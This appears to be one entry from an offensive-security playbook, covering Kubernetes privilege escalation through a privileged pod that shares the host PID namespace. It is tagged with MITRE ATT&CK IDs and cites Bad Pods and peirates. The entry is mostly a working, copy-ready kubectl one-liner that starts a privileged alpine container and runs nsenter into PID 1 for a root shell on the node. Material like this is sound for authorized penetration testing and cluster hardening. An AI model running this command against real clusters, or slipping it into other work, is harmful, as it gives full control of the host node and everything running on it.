---
id: k8s-privileged-pod
title: Privileged pod → node escape (nsenter into PID 1)
section: Kubernetes
phase: Privilege Escalation
attack:
  tactic: TA0004
  techniques: [T1610, T1611]
platform: [kubernetes]
source: peirates / Bad Pods (BishopFox), K8s container breakout
pair: k8s-privileged-pod-audit
---

If you can create pods (or exec into one that's already privileged), schedule a
privileged container sharing the host PID namespace, then `nsenter` into PID 1 for
a shell **on the node** — a full breakout from container to host. `kubectl run`
with an overrides blob does it in one shot; peirates / Bad Pods automate the
manifest. (Cluster — no on-host target, so no slots.)

```sh
kubectl run pwn --rm -it --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"pwn","image":"alpine","stdin":true,"tty":true,"securityContext":{"privileged":true},"command":["sh","-c","apk add --no-cache util-linux >/dev/null 2>&1; nsenter -t 1 -m -u -i -n -p -- bash"]}]}}'
```
